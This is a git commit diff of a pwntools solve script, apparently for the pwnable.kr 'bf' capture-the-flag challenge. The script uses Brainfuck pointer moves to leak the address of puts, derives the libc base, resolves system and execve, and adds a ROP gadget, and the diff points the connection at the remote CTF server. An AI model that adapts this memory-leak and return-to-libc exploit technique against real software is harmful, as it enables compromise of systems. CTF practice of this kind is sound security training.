eaee57dff126023bfd5dffdf2da04c73d2b6d519
Noy Pearl <11259340+noypearl@users.noreply.github.com>
2024-06-21 13:32:30 +0300

    fixed issues and merged with rop

--- brainfk/solve.py
+++ brainfk/solve.py
@@ -22,15 +22,12 @@ libc_base = 0xf7e1b000 # Bf local one
 libc.address = libc_base
 puts_addr = p32(next(libc.search(b"puts")))
 #execve_addr = p32(next(libc.search(b"libc_system")))
-target = libc_base + 0x001134d9 # add to esp
-my_rop = p32(target)
-print(f"ROP: {my_rop}")
 
 #print(f"DUMP: {my_rop.dump()}")
 # Start process
-#conn = remote("pwnable.kr",9001)
 #conn = process("./ctf-bf")
-conn = process(ELF_NAME)
+conn = remote("pwnable.kr",9001)
+#conn = process(ELF_NAME)
 #conn = gdb.debug("./bf",
 #env={"LD_PRELOAD":"./libc.so.6"}, gdbscript='''
 #br *0x8048717
@@ -60,6 +57,7 @@ payload=padding+p32(0xdeadbeef)+p32(execve_addr)+p32(return_addr)+p32(sh_addr)+p
 print(f"sh_addr: {str(sh_addr)}")
 payload += b"<" * 136 #move back 136 bytes -,.\nAB\n".encode() # --> should work
 payload += b".>.>.>." # leak the address of libc
+payload += b"<<<" # leak the address of libc
 #payload += "<" * 128 #move back 136 bytes -,.\nAB\n".encode() # --> should work
 payload += b",>,>,>," # putchar - for sending the last char
 payload += b"[" # call to puts()
@@ -71,22 +69,26 @@ with open("payload", "wb+") as f:
     f.write(payload)
 # separate sends cuz of annoying encoding / decoding issue with p32() and
 # strings
+target = libc_base + 0x001134d9 # add to esp
+my_rop = p32(target)
+print(f"ROP: {my_rop}")
 payload = my_rop
-#payload = p32(0xf7e55db0) # system()
+payload +=b"BBBB"
 payload +=b"\n"
 conn.send(payload)
 with open("payload", "ab+") as f:
     f.write(payload)
 
-#payload += "AAAA"
-#payload += system_addr
-#payload += ".+" * 224 # print 4 characters from puts() function
-#payload = payload.encode().replace('\\n','\n')
 print(payload)
 
 print(conn.recvline()) # main massage
 print(conn.recvline()) # main massage 2
-puts_addr = unpack(conn.recv(), endian='little')
+output = conn.recv()
+with open("output", "wb") as a:
+    a.write(output)
+
+print(f"OUTPUT: {output}")
+puts_addr = unpack(output, endian='little')
 print(f"puts addr: {puts_addr}") # receive until newline
 print(f"puts addr: {hex(puts_addr)}") # receive until newline
 puts_distance_from_libc = 392368
@@ -94,16 +96,12 @@ print(f"distance: {puts_distance_from_libc}")
 libc_addr = puts_addr - puts_distance_from_libc
 print(f"libc addr: {libc_addr}") # receive until newline
 print(f"libc addr: {hex(libc_addr)}") # receive until newline
+libc.address = libc_addr
+system_addr = libc.symbols["system"]
+execve_addr = libc.symbols["execve"]
+print(f"system_addr: {str(system_addr)}")
+print(f"execve: {str(execve_addr)}")
 
-#print(f"Program output: {output}") # receive until newline
-#conn.send("ls\n")
-#conn.interactive()
-#output = conn.recvline()
-#output += conn.recvline()
-#output += conn.recvline()
-#print(f"Program output: {output.decode()}") # receive until newline
-#conn.recvuntil(b"result:") # receive until given keyword
-#conn.send(b"-,+" + "\n" + "AB")
 
 
 
